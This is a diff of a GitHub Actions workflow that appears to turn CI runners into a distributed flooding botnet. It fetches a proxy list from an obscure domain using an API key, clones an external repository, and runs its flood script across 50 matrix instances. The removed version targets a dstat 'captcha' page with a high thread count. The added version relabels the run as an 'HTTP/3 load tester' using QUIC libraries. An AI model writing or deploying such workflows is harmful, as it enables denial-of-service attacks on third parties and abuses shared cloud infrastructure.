@@ -24,19 +24,35 @@ jobs:
         with:
           node-version: '20'
       
-      - name: Install dependencies
-        run: npm install net chalk hpack.js hpack colors puppeteer-real-browser
+      - name: Setup Python
+        uses: actions/setup-python@v4
+        with:
+          python-version: '3.10'
+      
+      - name: Install system dependencies
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y python3-pip python3-dev build-essential libssl-dev
+          python3 --version
+          pip3 --version
+      
+      - name: Install Python packages for HTTP/3 load testing
+        run: |
+          pip3 install --upgrade pip
+          pip3 install aioquic uvloop requests
+      
+      - name: Install Node.js dependencies
+        run: npm install net chalk hpack.js hpack colors puppeteer-real-browser cluster
       
       - name: Download proxies
-        run: curl -s "https://xn--mnqu23e2hf.lol/api.php?key=user1208&country=all" > proxy.txt
+        run: curl -s "https://xn--mnqu23e2hf.lol/api.php?key=user1208&country=all" > k.txt
       
-      - name: Clone repository and run m.js
+      - name: Run HTTP/3 load tester (if Python script exists)
         run: |
           git clone https://github.com/vrbrh921-glitch/Fc.git
           cd Fc
-          node m.js https://captcha.dstatbot.win/u6c8zjEB 700 1 1 1
+          python3 m.py
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 50
           RUNNER_OS: ubuntu
-
